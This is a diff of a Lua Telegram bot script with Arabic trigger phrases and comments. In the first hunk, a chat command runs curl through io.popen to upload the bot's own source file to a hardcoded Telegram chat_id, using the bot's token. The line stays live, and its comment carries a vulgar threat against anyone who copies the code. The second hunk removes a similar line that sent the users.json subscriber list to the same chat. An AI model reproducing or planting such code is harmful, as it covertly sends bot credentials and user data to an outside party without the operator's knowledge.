@@ -5196,7 +5196,7 @@ end
 end,nil)  
 end
 if text == 'سحب السورس' or text == 'جلب السورس' then 
-local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هجيبك من طيزك
+local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
 send(msg.chat_id_, msg.id_,' جاري ارسال السورس الي المبرمج')
 end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
@@ -5239,8 +5239,9 @@ local File = io.open('./users.json', "w")
 File:write(t)
 File:close()
 sendDocument(msg.chat_id_, msg.id_, './users.json', 'عدد المشتركين :'..#list)
-local curlu = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'users.json'..'"' io.popen(curlu) ---- كود كتابه أحمد عياد هتسرق هجيبك من طيزك
 end 
+return false  
+end
 if text == 'جلب نسخه الاحتياطيه' and DevSoFi(msg) then 
 GetFile_Bot(msg)
 end
